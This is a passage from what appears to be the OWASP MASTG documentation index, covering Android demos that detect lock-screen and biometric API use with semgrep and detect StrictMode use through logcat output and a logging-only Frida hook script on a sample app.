shows the use of <code>KeyguardManager.isDeviceSecure</code> and <code>BiometricManager.canAuthenticate</code> at runtime. We can see that:</p> <ul> <li><code>KeyguardManager.isDeviceSecure</code> is called from the file <code>MastgTest.kt</code>, class <code>MastgTest</code>, method <code>isDeviceSecure</code> at line 24.</li> <li><code>BiometricManager.canAuthenticate</code> is called from the file <code>MastgTest.kt</code>, class <code>MastgTest</code>, method <code>checkStrongBiometricStatus</code> at line 38.</li> </ul> <p>Note that in this case the output contains file names and even line numbers, but in real-world scenarios, this information may not be available or not be that useful (e.g. when using a production build or when the app is obfuscated). The output is still valuable because it shows that the APIs are being used at runtime.</p>","tags":["android","demo","MASTG-TEST-0249"]},{"location":"MASTG/demos/android/MASVS-RESILIENCE/MASTG-DEMO-0028/MASTG-DEMO-0028/","title":"MASTG-DEMO-0028: Uses of KeyguardManager.isDeviceSecure and BiometricManager.canAuthenticate with semgrep","text":"<p>  Download MASTG-DEMO-0028 APK   Open MASTG-DEMO-0028 Folder  Build MASTG-DEMO-0028 APK</p>","tags":["android","demo","MASTG-TEST-0247"]},{"location":"MASTG/demos/android/MASVS-RESILIENCE/MASTG-DEMO-0028/MASTG-DEMO-0028/#sample","title":"Sample","text":"<p>This sample checks if the device has a secure lock screen via <code>KeyguardManager.isDeviceSecure</code> and if the device supports strong biometric authentication using <code>BiometricManager.canAuthenticate</code>.</p> MastgTest.ktMastgTest_reversed.java <pre><code>package org.owasp.mastestapp\n\nimport android.app.KeyguardManager\nimport android.content.Context\nimport android.hardware.biometrics.BiometricManager\nimport android.os.Build\n\nclass MastgTest(private val context: Context) {\n    fun mastgTest(): String {\n        val isLocked = isDeviceSecure(context)\n        val biometricStatus = checkStrongBiometricStatus()\n        return \"Device has a passcode: $isLocked\\n\\n\" +\n                \"Biometric status: $biometricStatus\"\n    }\n\n    /**\n     * Checks if the device has a secure lock screen (e.g., PIN, pattern, password).\n     *\n     * @return `true` if the device has a secure lock screen, `false` otherwise.\n     */\n\n    fun isDeviceSecure(context: Context): Boolean {\n        val keyguardManager = context.getSystemService(Context.KEYGUARD_SERVICE) as KeyguardManager\n        return keyguardManager.isDeviceSecure\n    }\n\n    /**\n     * Checks if the device supports strong biometric authentication (e.g., fingerprint, face, iris)\n     * and if the user has enrolled biometric credentials.\n     *\n     * **Note:** This API is available on API level 30 (Android R) and above.\n     *\n     * @return A human-readable string describing the biometric status.\n     */\n    fun checkStrongBiometricStatus(): String {\n        if (Build.VERSION.SDK_INT &gt;= Build.VERSION_CODES.R) {\n            val biometricManager = context.getSystemService(BiometricManager::class.java)\n            val result = biometricManager.canAuthenticate(BiometricManager.Authenticators.BIOMETRIC_STRONG)\n            return when (result) {\n                BiometricManager.BIOMETRIC_SUCCESS -&gt;\n                    \"BIOMETRIC_SUCCESS - Strong biometric authentication is available.\"\n                BiometricManager.BIOMETRIC_ERROR_NO_HARDWARE -&gt;\n                    \"BIOMETRIC_ERROR_NO_HARDWARE - No biometric hardware available.\"\n                BiometricManager.BIOMETRIC_ERROR_HW_UNAVAILABLE -&gt;\n                    \"BIOMETRIC_ERROR_HW_UNAVAILABLE - Biometric hardware is currently unavailable.\"\n                BiometricManager.BIOMETRIC_ERROR_NONE_ENROLLED -&gt;\n                    \"BIOMETRIC_ERROR_NONE_ENROLLED - No biometrics enrolled.\"\n                else -&gt;\n                    \"Unknown biometric status: $result\"\n            }\n        } else {\n            return \"Strong biometric authentication check is not supported on this API level.\"\n        }\n    }\n}\n</code></pre> <pre><code>package org.owasp.mastestapp;\n\nimport android.app.KeyguardManager;\nimport android.content.Context;\nimport android.hardware.biometrics.BiometricManager;\nimport android.os.Build;\nimport kotlin.Metadata;\nimport kotlin.jvm.internal.Intrinsics;\n\n/* compiled from: MastgTest.kt */\n@Metadata(d1 = {\"\\u0000 \\n\\u0002\\u0018\\u0002\\n\\u0002\\u0010\\u0000\\n\\u0000\\n\\u0002\\u0018\\u0002\\n\\u0002\\b\\u0002\\n\\u0002\\u0010\\u000e\\n\\u0000\\n\\u0002\\u0010\\u000b\\n\\u0002\\b\\u0002\\b\\u0007\\u0018\\u00002\\u00020\\u0001B\\r\\u0012\\u0006\\u0010\\u0002\\u001a\\u00020\\u0003\u00a2\\u0006\\u0002\\u0010\\u0004J\\u0006\\u0010\\u0005\\u001a\\u00020\\u0006J\\u000e\\u0010\\u0007\\u001a\\u00020\\b2\\u0006\\u0010\\u0002\\u001a\\u00020\\u0003J\\u0006\\u0010\\t\\u001a\\u00020\\u0006R\\u000e\\u0010\\u0002\\u001a\\u00020\\u0003X\\u0082\\u0004\u00a2\\u0006\\u0002\\n\\u0000\u00a8\\u0006\\n\"}, d2 = {\"Lorg/owasp/mastestapp/MastgTest;\", \"\", \"context\", \"Landroid/content/Context;\", \"(Landroid/content/Context;)V\", \"checkStrongBiometricStatus\", \"\", \"isDeviceSecure\", \"\", \"mastgTest\", \"app_debug\"}, k = 1, mv = {1, 9, 0}, xi = 48)\n/* loaded from: classes4.dex */\npublic final class MastgTest {\n    public static final int $stable = 8;\n    private final Context context;\n\n    public MastgTest(Context context) {\n        Intrinsics.checkNotNullParameter(context, \"context\");\n        this.context = context;\n    }\n\n    public final String mastgTest() {\n        boolean isLocked = isDeviceSecure(this.context);\n        String biometricStatus = checkStrongBiometricStatus();\n        return \"Device has a passcode: \" + isLocked + \"\\n\\nBiometric status: \" + biometricStatus;\n    }\n\n    public final boolean isDeviceSecure(Context context) {\n        Intrinsics.checkNotNullParameter(context, \"context\");\n        Object systemService = context.getSystemService(\"keyguard\");\n        Intrinsics.checkNotNull(systemService, \"null cannot be cast to non-null type android.app.KeyguardManager\");\n        KeyguardManager keyguardManager = (KeyguardManager) systemService;\n        return keyguardManager.isDeviceSecure();\n    }\n\n    public final String checkStrongBiometricStatus() {\n        if (Build.VERSION.SDK_INT &gt;= 30) {\n            BiometricManager biometricManager = (BiometricManager) this.context.getSystemService(BiometricManager.class);\n            int result = biometricManager.canAuthenticate(15);\n            switch (result) {\n                case 0:\n                    return \"BIOMETRIC_SUCCESS - Strong biometric authentication is available.\";\n                case 1:\n                    return \"BIOMETRIC_ERROR_HW_UNAVAILABLE - Biometric hardware is currently unavailable.\";\n                case 11:\n                    return \"BIOMETRIC_ERROR_NONE_ENROLLED - No biometrics enrolled.\";\n                case 12:\n                    return \"BIOMETRIC_ERROR_NO_HARDWARE - No biometric hardware available.\";\n                default:\n                    return \"Unknown biometric status: \" + result;\n            }\n        }\n        return \"Strong biometric authentication check is not supported on this API level.\";\n    }\n}\n</code></pre>","tags":["android","demo","MASTG-TEST-0247"]},{"location":"MASTG/demos/android/MASVS-RESILIENCE/MASTG-DEMO-0028/MASTG-DEMO-0028/#steps","title":"Steps","text":"<p>Let's run  semgrep rules against the sample code.</p> ../../../../rules/mastg-android-device-passcode-present.yml<pre><code>rules:\n  - id: mastg-android-device-passcode-present\n    languages:\n      - java\n    severity: INFO\n    metadata:\n      summary: This rule searches for API that checks whether the device passcode is set.\n    message: \"[MASVS-STORAGE] Make sure to verify that your app runs on a device with a passcode set\"\n    pattern-either:\n      - pattern: |\n          $X.getSystemService(\"keyguard\");\n          ...\n          $Y.isDeviceSecure();\n      - pattern: |\n          BiometricManager $BM = (BiometricManager) $X.getSystemService(BiometricManager.class);\n          ...\n          $BM.canAuthenticate($VAL);\n</code></pre> run.sh<pre><code>NO_COLOR=true semgrep -c ../../../../rules/mastg-android-device-passcode-present.yml ./MastgTest_reversed.java --text -o output.txt\n</code></pre>","tags":["android","demo","MASTG-TEST-0247"]},{"location":"MASTG/demos/android/MASVS-RESILIENCE/MASTG-DEMO-0028/MASTG-DEMO-0028/#observation","title":"Observation","text":"<p>The output shows all usages of APIs related to secure screen lock detection.</p> output.txt<pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502 2 Code Findings \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n\n    MastgTest_reversed.java\n     \u2771 \u001b[1mrules.mastg-android-device-passcode-present\u001b[0m\n          [MASVS-STORAGE] Make sure to verify that your app runs on a device with a passcode set\n\n           30\u2506 Object systemService = context.getSystemService(\"keyguard\");\n           31\u2506 Intrinsics.checkNotNull(systemService, \"null cannot be cast to non-null type\n               android.app.KeyguardManager\");                                              \n           32\u2506 KeyguardManager keyguardManager = (KeyguardManager) systemService;\n           33\u2506 return keyguardManager.isDeviceSecure();\n            \u22ee\u2506----------------------------------------\n           38\u2506 BiometricManager biometricManager = (BiometricManager)\n               this.context.getSystemService(BiometricManager.class);\n           39\u2506 int result = biometricManager.canAuthenticate(15);\n</code></pre>","tags":["android","demo","MASTG-TEST-0247"]},{"location":"MASTG/demos/android/MASVS-RESILIENCE/MASTG-DEMO-0028/MASTG-DEMO-0028/#evaluation","title":"Evaluation","text":"<p>The test passes because the output shows references to APIs that check for secure screen lock presence, specifically:</p> <ul> <li><code>KeyguardManager.isDeviceSecure</code> in line 33</li> <li><code>BiometricManager.canAuthenticate</code> in line 39</li> </ul>","tags":["android","demo","MASTG-TEST-0247"]},{"location":"MASTG/demos/android/MASVS-RESILIENCE/MASTG-DEMO-0037/MASTG-DEMO-0037/","title":"MASTG-DEMO-0037: App Leaking Information about Unclosed SQL Cursor via StrictMode","text":"<p>  Download MASTG-DEMO-0037 APK   Open MASTG-DEMO-0037 Folder  Build MASTG-DEMO-0037 APK</p>","tags":["android","demo","MASTG-TEST-0263"]},{"location":"MASTG/demos/android/MASVS-RESILIENCE/MASTG-DEMO-0037/MASTG-DEMO-0037/#sample","title":"Sample","text":"<p>The snippet below shows sample code that enables a <code>StrictMode</code> policy to detect leaked (i.e., unclosed) SQLite objects. When such an object is detected, a log message is emitted to the system log.</p> <p>The snippet then opens an SQL Cursor which remains unclosed, to trigger the policy.</p> MastgTest.kt<pre><code>package org.owasp.mastestapp\n\nimport android.content.Context\nimport android.database.sqlite.SQLiteDatabase\nimport android.os.StrictMode\n\n\nclass MastgTest (private val context: Context){\n\n    fun mastgTest(): String {\n        enableStrictMode()\n        triggerSqliteCursorLeak()\n\n        System.gc() // Force garbage collection to trigger leak detection\n\n        return \"SUCCESS!!\\n\\nSQL Cursor leaked.\"\n    }\n\n    private fun enableStrictMode() {\n        StrictMode.setVmPolicy(\n            StrictMode.VmPolicy.Builder()\n                .detectLeakedClosableObjects() // Detect leaked/unclosed SQLite objects\n                .penaltyLog()                 // Log violations\n                .build()\n        )\n    }\n\n    private fun triggerSqliteCursorLeak() {\n        val db: SQLiteDatabase = context.openOrCreateDatabase(\"test.db\", Context.MODE_PRIVATE, null)\n        db.execSQL(\"CREATE TABLE IF NOT EXISTS users (id INTEGER PRIMARY KEY, name TEXT)\")\n        db.execSQL(\"INSERT INTO users (name) VALUES ('Alice'), ('Bob')\")\n\n        // Create cursor, and intentionally do not close it\n        val cursor = db.rawQuery(\"SELECT * FROM users\", null)\n    }\n}\n</code></pre>","tags":["android","demo","MASTG-TEST-0263"]},{"location":"MASTG/demos/android/MASVS-RESILIENCE/MASTG-DEMO-0037/MASTG-DEMO-0037/#steps","title":"Steps","text":"<ol> <li>Install the app on your device.</li> <li>Open the app and let it execute.</li> <li>Execute <code>run.sh</code> which uses  Monitoring System Logs to show the system logs created by <code>StrictMode</code>.</li> </ol> run.sh<pre><code>adb logcat -s StrictMode -d &gt; output.txt\n</code></pre>","tags":["android","demo","MASTG-TEST-0263"]},{"location":"MASTG/demos/android/MASVS-RESILIENCE/MASTG-DEMO-0037/MASTG-DEMO-0037/#observation","title":"Observation","text":"<p>The system log outputs all detected <code>StrictMode</code> policy violations.</p> output.txt<pre><code>03-26 11:33:23.415  2340  2407 D StrictMode: StrictMode policy violation: android.os.strictmode.LeakedClosableViolation: A resource was acquired at attached stack trace but never released. See java.io.Closeable for information on avoiding resource leaks.\n03-26 11:33:23.415  2340  2407 D StrictMode:    at android.os.StrictMode$AndroidCloseGuardReporter.report(StrictMode.java:1994)\n03-26 11:33:23.415  2340  2407 D StrictMode:    at dalvik.system.CloseGuard.warnIfOpen(CloseGuard.java:336)\n03-26 11:33:23.415  2340  2407 D StrictMode:    at android.database.AbstractCursor.finalize(AbstractCursor.java:531)\n03-26 11:33:23.415  2340  2407 D StrictMode:    at android.database.sqlite.SQLiteCursor.finalize(SQLiteCursor.java:291)\n03-26 11:33:23.415  2340  2407 D StrictMode:    at java.lang.Daemons$FinalizerDaemon.doFinalize(Daemons.java:339)\n03-26 11:33:23.415  2340  2407 D StrictMode:    at java.lang.Daemons$FinalizerDaemon.processReference(Daemons.java:324)\n03-26 11:33:23.415  2340  2407 D StrictMode:    at java.lang.Daemons$FinalizerDaemon.runInternal(Daemons.java:300)\n03-26 11:33:23.415  2340  2407 D StrictMode:    at java.lang.Daemons$Daemon.run(Daemons.java:145)\n03-26 11:33:23.415  2340  2407 D StrictMode:    at java.lang.Thread.run(Thread.java:1012)\n03-26 11:33:23.415  2340  2407 D StrictMode: Caused by: java.lang.Throwable: Explicit termination method 'AbstractCursor.close' not called\n03-26 11:33:23.415  2340  2407 D StrictMode:    at dalvik.system.CloseGuard.openWithCallSite(CloseGuard.java:288)\n03-26 11:33:23.415  2340  2407 D StrictMode:    at dalvik.system.CloseGuard.open(CloseGuard.java:257)\n03-26 11:33:23.415  2340  2407 D StrictMode:    at android.database.AbstractCursor.&lt;init&gt;(AbstractCursor.java:227)\n03-26 11:33:23.415  2340  2407 D StrictMode:    at android.database.AbstractWindowedCursor.&lt;init&gt;(AbstractWindowedCursor.java:39)\n03-26 11:33:23.415  2340  2407 D StrictMode:    at android.database.sqlite.SQLiteCursor.&lt;init&gt;(SQLiteCursor.java:98)\n03-26 11:33:23.415  2340  2407 D StrictMode:    at android.database.sqlite.SQLiteDirectCursorDriver.query(SQLiteDirectCursorDriver.java:52)\n03-26 11:33:23.415  2340  2407 D StrictMode:    at android.database.sqlite.SQLiteDatabase.rawQueryWithFactory(SQLiteDatabase.java:1714)\n03-26 11:33:23.415  2340  2407 D StrictMode:    at android.database.sqlite.SQLiteDatabase.rawQuery(SQLiteDatabase.java:1653)\n03-26 11:33:23.415  2340  2407 D StrictMode:    at org.owasp.mastestapp.MastgTest.triggerSqliteCursorLeak(MastgTest.kt:35)\n03-26 11:33:23.415  2340  2407 D StrictMode:    at org.owasp.mastestapp.MastgTest.mastgTest(MastgTest.kt:12)\n03-26 11:33:23.415  2340  2407 D StrictMode:    at org.owasp.mastestapp.MainActivityKt$MyScreenContent$1$1$1.invoke(MainActivity.kt:117)\n03-26 11:33:23.415  2340  2407 D StrictMode:    at org.owasp.mastestapp.MainActivityKt$MyScreenContent$1$1$1.invoke(MainActivity.kt:115)\n03-26 11:33:23.415  2340  2407 D StrictMode:    at androidx.compose.foundation.ClickablePointerInputNode$pointerInput$3.invoke-k-4lQ0M(Clickable.kt:987)\n03-26 11:33:23.415  2340  2407 D StrictMode:    at androidx.compose.foundation.ClickablePointerInputNode$pointerInput$3.invoke(Clickable.kt:981)\n03-26 11:33:23.415  2340  2407 D StrictMode:    at androidx.compose.foundation.gestures.TapGestureDetectorKt$detectTapAndPress$2$1.invokeSuspend(TapGestureDetector.kt:255)\n03-26 11:33:23.415  2340  2407 D StrictMode:    at kotlin.coroutines.jvm.internal.BaseContinuationImpl.resumeWith(ContinuationImpl.kt:33)\n03-26 11:33:23.415  2340  2407 D StrictMode:    at kotlinx.coroutines.DispatchedTaskKt.resume(DispatchedTask.kt:177)\n03-26 11:33:23.415  2340  2407 D StrictMode:    at kotlinx.coroutines.DispatchedTaskKt.dispatch(DispatchedTask.kt:166)\n03-26 11:33:23.415  2340  2407 D StrictMode:    at kotlinx.coroutines.CancellableContinuationImpl.dispatchResume(CancellableContinuationImpl.kt:474)\n03-26 11:33:23.415  2340  2407 D StrictMode:    at kotlinx.coroutines.CancellableContinuationImpl.resumeImpl(CancellableContinuationImpl.kt:508)\n03-26 11:33:23.415  2340  2407 D StrictMode:    at kotlinx.coroutines.CancellableContinuationImpl.resumeImpl$default(CancellableContinuationImpl.kt:497)\n03-26 11:33:23.415  2340  2407 D StrictMode:    at kotlinx.coroutines.CancellableContinuationImpl.resumeWith(CancellableContinuationImpl.kt:368)\n03-26 11:33:23.415  2340  2407 D StrictMode:    at androidx.compose.ui.input.pointer.SuspendingPointerInputModifierNodeImpl$PointerEventHandlerCoroutine.offerPointerEvent(SuspendingPointerInputFilter.kt:665)\n03-26 11:33:23.415  2340  2407 D StrictMode:    at androidx.compose.ui.input.pointer.SuspendingPointerInputModifierNodeImpl.dispatchPointerEvent(SuspendingPointerInputFilter.kt:544)\n03-26 11:33:23.415  2340  2407 D StrictMode:    at androidx.compose.ui.input.pointer.SuspendingPointerInputModifierNodeImpl.onPointerEvent-H0pRuoY(SuspendingPointerInputFilter.kt:566)\n03-26 11:33:23.415  2340  2407 D StrictMode:    at androidx.compose.foundation.AbstractClickablePointerInputNode.onPointerEvent-H0pRuoY(Clickable.kt:947)\n03-26 11:33:23.415  2340  2407 D StrictMode:    at androidx.compose.foundation.AbstractClickableNode.onPointerEvent-H0pRuoY(Clickable.kt:795)\n03-26 11:33:23.415  2340  2407 D StrictMode:    at androidx.compose.ui.input.pointer.Node.dispatchMainEventPass(HitPathTracker.kt:317)\n03-26 11:33:23.415  2340  2407 D StrictMode:    at androidx.compose.ui.input.pointer.Node.dispatchMainEventPass(HitPathTracker.kt:303)\n03-26 11:33:23.415  2340  2407 D StrictMode:    at androidx.compose.ui.input.pointer.NodeParent.dispatchMainEventPass(HitPathTracker.kt:185)\n03-26 11:33:23.415  2340  2407 D StrictMode:    at androidx.compose.ui.input.pointer.HitPathTracker.dispatchChanges(HitPathTracker.kt:104)\n03-26 11:33:23.415  2340  2407 D StrictMode:    at androidx.compose.ui.input.pointer.PointerInputEventProcessor.process-BIzXfog(PointerInputEventProcessor.kt:113)\n03-26 11:33:23.415  2340  2407 D StrictMode:    at androidx.compose.ui.platform.AndroidComposeView.sendMotionEvent-8iAsVTc(AndroidComposeView.android.kt:1576)\n03-26 11:33:23.415  2340  2407 D StrictMode:    at androidx.compose.ui.platform.AndroidComposeView.handleMotionEvent-8iAsVTc(AndroidComposeView.android.kt:1527)\n03-26 11:33:23.415  2340  2407 D StrictMode:    at androidx.compose.ui.platform.AndroidComposeView.dispatchTouchEvent(AndroidComposeView.android.kt:1466)\n03-26 11:33:23.415  2340  2407 D StrictMode:    at android.view.ViewGroup.dispatchTransformedTouchEvent(ViewGroup.java:3120)\n03-26 11:33:23.415  2340  2407 D StrictMode:    at android.view.ViewGroup.dispatchTouchEvent(ViewGroup.java:2801)\n03-26 11:33:23.415  2340  2407 D StrictMode:    at android.view.ViewGroup.dispatchTransformedTouchEvent(ViewGroup.java:3120)\n03-26 11:33:23.415  2340  2407 D StrictMode:    at android.view.ViewGroup.dispatchTouchEvent(ViewGroup.java:2801)\n03-26 11:33:23.415  2340  2407 D StrictMode:    at android.view.ViewGroup.dispatchTransformedTouchEvent(ViewGroup.java:3120)\n03-26 11:33:23.415  2340  2407 D StrictMode:    at android.view.ViewGroup.dispatchTouchEvent(ViewGroup.java:2801)\n03-26 11:33:23.415  2340  2407 D StrictMode:    at android.view.ViewGroup.dispatchTransformedTouchEvent(ViewGroup.java:3120)\n03-26 11:33:23.415  2340  2407 D StrictMode:    at android.view.ViewGroup.dispatchTouchEvent(ViewGroup.java:2801)\n03-26 11:33:23.415  2340  2407 D StrictMode:    at com.android.internal.policy.DecorView.superDispatchTouchEvent(DecorView.java:490)\n03-26 11:33:23.415  2340  2407 D StrictMode:    at com.android.internal.policy.PhoneWindow.superDispatchTouchEvent(PhoneWindow.java:1904)\n03-26 11:33:23.415  2340  2407 D StrictMode:    at android.app.Activity.dispatchTouchEvent(Activity.java:4377)\n03-26 11:33:23.415  2340  2407 D StrictMode:    at com.android.internal.policy.DecorView.dispatchTouchEvent(DecorView.java:448)\n03-26 11:33:23.415  2340  2407 D StrictMode:    at android.view.View.dispatchPointerEvent(View.java:15919)\n03-26 11:33:23.415  2340  2407 D StrictMode:    at android.view.ViewRootImpl$ViewPostImeInputStage.processPointerEvent(ViewRootImpl.java:7021)\n03-26 11:33:23.415  2340  2407 D StrictMode:    at android.view.ViewRootImpl$ViewPostImeInputStage.onProcess(ViewRootImpl.java:6815)\n03-26 11:33:23.415  2340  2407 D StrictMode:    at android.view.ViewRootImpl$InputStage.deliver(ViewRootImpl.java:6229)\n03-26 11:33:23.415  2340  2407 D StrictMode:    at android.view.ViewRootImpl$InputStage.onDeliverToNext(ViewRootImpl.java:6286)\n03-26 11:33:23.415  2340  2407 D StrictMode:    at android.view.ViewRootImpl$InputStage.forward(ViewRootImpl.java:6252)\n03-26 11:33:23.415  2340  2407 D StrictMode:    at android.view.ViewRootImpl$AsyncInputStage.forward(ViewRootImpl.java:6417)\n03-26 11:33:23.415  2340  2407 D StrictMode:    at android.view.ViewRootImpl$InputStage.apply(ViewRootImpl.java:6260)\n03-26 11:33:23.415  2340  2407 D StrictMode:    at android.view.ViewRootImpl$AsyncInputStage.apply(ViewRootImpl.java:6474)\n03-26 11:33:23.415  2340  2407 D StrictMode:    at android.view.ViewRootImpl$InputStage.deliver(ViewRootImpl.java:6233)\n03-26 11:33:23.415  2340  2407 D StrictMode:    at android.view.ViewRootImpl$InputStage.onDeliverToNext(ViewRootImpl.java:6286)\n03-26 11:33:23.415  2340  2407 D StrictMode:    at android.view.ViewRootImpl$InputStage.forward(ViewRootImpl.java:6252)\n03-26 11:33:23.415  2340  2407 D StrictMode:    at android.view.ViewRootImpl$InputStage.apply(ViewRootImpl.java:6260)\n03-26 11:33:23.415  2340  2407 D StrictMode:    at android.view.ViewRootImpl$InputStage.deliver(ViewRootImpl.java:6233)\n03-26 11:33:23.415  2340  2407 D StrictMode:    at android.view.ViewRootImpl.deliverInputEvent(ViewRootImpl.java:9211)\n03-26 11:33:23.415  2340  2407 D StrictMode:    at android.view.ViewRootImpl.doProcessInputEvents(ViewRootImpl.java:9162)\n03-26 11:33:23.415  2340  2407 D StrictMode:    at android.view.ViewRootImpl.enqueueInputEvent(ViewRootImpl.java:9131)\n03-26 11:33:23.415  2340  2407 D StrictMode:    at android.view.ViewRootImpl$WindowInputEventReceiver.onInputEvent(ViewRootImpl.java:9337)\n03-26 11:33:23.415  2340  2407 D StrictMode:    at android.view.InputEventReceiver.dispatchInputEvent(InputEventReceiver.java:267)\n03-26 11:33:23.415  2340  2407 D StrictMode:    at android.os.MessageQueue.nativePollOnce(Native Method)\n03-26 11:33:23.415  2340  2407 D StrictMode:    at android.os.MessageQueue.next(MessageQueue.java:335)\n03-26 11:33:23.415  2340  2407 D StrictMode:    at android.os.Looper.loopOnce(Looper.java:162)\n03-26 11:33:23.415  2340  2407 D StrictMode:    at android.os.Looper.loop(Looper.java:294)\n03-26 11:33:23.415  2340  2407 D StrictMode:    at android.app.ActivityThread.main(ActivityThread.java:8177)\n03-26 11:33:23.415  2340  2407 D StrictMode:    at java.lang.reflect.Method.invoke(Native Method)\n03-26 11:33:23.415  2340  2407 D StrictMode:    at com.android.internal.os.RuntimeInit$MethodAndArgsCaller.run(RuntimeInit.java:552)\n03-26 11:33:23.415  2340  2407 D StrictMode:    at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:971)\n</code></pre>","tags":["android","demo","MASTG-TEST-0263"]},{"location":"MASTG/demos/android/MASVS-RESILIENCE/MASTG-DEMO-0037/MASTG-DEMO-0037/#evaluation","title":"Evaluation","text":"<p>The test fails because <code>StrictMode</code> is enabled, as we can see from the system log output which shows that there is a location (<code>MastgTest.kt:35</code>) where an SQL cursor is not closed properly.</p> <p>Note: The reported cursor not being closed is a different issue outside the scope of this demo.</p>","tags":["android","demo","MASTG-TEST-0263"]},{"location":"MASTG/demos/android/MASVS-RESILIENCE/MASTG-DEMO-0038/MASTG-DEMO-0038/","title":"MASTG-DEMO-0038: Detecting StrictMode Uses with Frida","text":"<p>  Download MASTG-DEMO-0038 APK   Open MASTG-DEMO-0038 Folder  Build MASTG-DEMO-0038 APK</p>","tags":["android","demo","MASTG-TEST-0264"]},{"location":"MASTG/demos/android/MASVS-RESILIENCE/MASTG-DEMO-0038/MASTG-DEMO-0038/#sample","title":"Sample","text":"<p>This sample demonstrates the detection of <code>StrictMode</code> uses at runtime using Frida. The app enables a <code>StrictMode</code> policy to detect leaked SQLite objects and intentionally leaves a cursor unclosed to trigger the policy.</p> ../MASTG-DEMO-0037/MastgTest.kt<pre><code>package org.owasp.mastestapp\n\nimport android.content.Context\nimport android.database.sqlite.SQLiteDatabase\nimport android.os.StrictMode\n\n\nclass MastgTest (private val context: Context){\n\n    fun mastgTest(): String {\n        enableStrictMode()\n        triggerSqliteCursorLeak()\n\n        System.gc() // Force garbage collection to trigger leak detection\n\n        return \"SUCCESS!!\\n\\nSQL Cursor leaked.\"\n    }\n\n    private fun enableStrictMode() {\n        StrictMode.setVmPolicy(\n            StrictMode.VmPolicy.Builder()\n                .detectLeakedClosableObjects() // Detect leaked/unclosed SQLite objects\n                .penaltyLog()                 // Log violations\n                .build()\n        )\n    }\n\n    private fun triggerSqliteCursorLeak() {\n        val db: SQLiteDatabase = context.openOrCreateDatabase(\"test.db\", Context.MODE_PRIVATE, null)\n        db.execSQL(\"CREATE TABLE IF NOT EXISTS users (id INTEGER PRIMARY KEY, name TEXT)\")\n        db.execSQL(\"INSERT INTO users (name) VALUES ('Alice'), ('Bob')\")\n\n        // Create cursor, and intentionally do not close it\n        val cursor = db.rawQuery(\"SELECT * FROM users\", null)\n    }\n}\n</code></pre>","tags":["android","demo","MASTG-TEST-0264"]},{"location":"MASTG/demos/android/MASVS-RESILIENCE/MASTG-DEMO-0038/MASTG-DEMO-0038/#steps","title":"Steps","text":"<ol> <li>Install the app on a device ( Installing Apps)</li> <li>Make sure you have  Frida for Android installed on your machine and the frida-server running on the device</li> <li>Run <code>run.sh</code> to spawn the app with Frida</li> <li>Click the Start button</li> <li>Stop the script by pressing <code>Ctrl+C</code></li> </ol> run.shscript.js <pre><code>#!/bin/bash\nfrida -U -f org.owasp.mastestapp -l ./script.js -o output.txt\n</code></pre> <pre><code>Java.perform(() =&gt; {\n\n    // Function to print backtrace with a configurable number of lines (default: 8)\n    function printBacktrace(maxLines = 8) {\n        let Exception = Java.use(\"java.lang.Exception\");\n        let stackTrace = Exception.$new().getStackTrace().toString().split(\",\");\n\n        console.log(\"\\nBacktrace:\");\n        for (let i = 0; i &lt; Math.min(maxLines, stackTrace.length); i++) {\n            console.log(stackTrace[i]);\n        }\n    }\n\n    // Hook StrictMode.setVmPolicy\n    let StrictMode = Java.use('android.os.StrictMode');\n\n    StrictMode.setVmPolicy.implementation = function (policy) {\n        console.log(\"\\n[*] StrictMode.setVmPolicy() called\\n\");\n\n        // Java stack trace\n        printBacktrace();\n\n        console.log(\"Policy: \" + policy);\n        this.setVmPolicy(policy);\n    };\n\n    // Hook StrictMode.VmPolicy.Builder.penaltyLog\n    let VmPolicyBuilder = Java.use('android.os.StrictMode$VmPolicy$Builder');\n\n    VmPolicyBuilder.penaltyLog.implementation = function () {\n        console.log(\"\\n[*] StrictMode.VmPolicy.Builder.penaltyLog() called\\n\");\n\n        // Java stack trace\n        printBacktrace();\n\n        return this.penaltyLog();\n    };\n\n    console.log(\"\\n[+] Frida script loaded to detect StrictMode usage and penaltyLog calls.\\n\");\n});\n</code></pre>","tags":["android","demo","MASTG-TEST-0264"]},{"location":"MASTG/demos/android/MASVS-RESILIENCE/MASTG-DEMO-0038/MASTG-DEMO-0038/#observation","title":"Observation","text":"<p>The Frida script output reveals the runtime usage of <code>StrictMode</code>.</p> output.txt<pre><code>[+] Frida script loaded to detect StrictMode usage and penaltyLog calls.\n\n\n[*] StrictMode.VmPolicy.Builder.penaltyLog() called\n\n\nBacktrace:\nandroid.os.StrictMode$VmPolicy$Builder.penaltyLog(Native Method)\nandroid.os.StrictMode$VmPolicy$Builder.build(StrictMode.java:1226)\nandroid.os.StrictMode.initVmDefaults(StrictMode.java:1522)\nandroid.app.ActivityThread.handleBindApplication(ActivityThread.java:6844)\nandroid.app.ActivityThread.handleBindApplication(Native Method)\nandroid.app.ActivityThread.-$$Nest$mhandleBindApplication(Unknown Source:0)\nandroid.app.ActivityThread$H.handleMessage(ActivityThread.java:2236)\nandroid.os.Handler.dispatchMessage(Handler.java:106)\n\n[*] StrictMode.setVmPolicy() called\n\n\nBacktrace:\nandroid.os.StrictMode.setVmPolicy(Native Method)\nandroid.os.StrictMode.initVmDefaults(StrictMode.java:1522)\nandroid.app.ActivityThread.handleBindApplication(ActivityThread.java:6844)\nandroid.app.ActivityThread.handleBindApplication(Native Method)\nandroid.app.ActivityThread.-$$Nest$mhandleBindApplication(Unknown Source:0)\nandroid.app.ActivityThread$H.handleMessage(ActivityThread.java:2236)\nandroid.os.Handler.dispatchMessage(Handler.java:106)\nandroid.os.Looper.loopOnce(Looper.java:205)\nPolicy: [StrictMode.VmPolicy; mask=1082130464]\n</code></pre>","tags":["android","demo","MASTG-TEST-0264"]},{"location":"MASTG/demos/android/MASVS-RESILIENCE/MASTG-DEMO-0038/MASTG-DEMO-0038/#evaluation","title":"Evaluation","text":"<p>The test fails because the Frida script output shows the runtime usage of <code>StrictMode</code>, specifically:</p> <ul> <li><code>StrictMode.VmPolicy.Builder.penaltyLog</code></li> <li><code>StrictMode.setVmPolicy</code></li> </ul>","tags":["android","demo","MASTG-TEST-0264"]},{"location":"MASTG/demos/android/MASVS-RESILIENCE/MASTG-DEMO-0039/MASTG-DEMO-0039/","title":"MASTG-DEMO-0039: Detecting 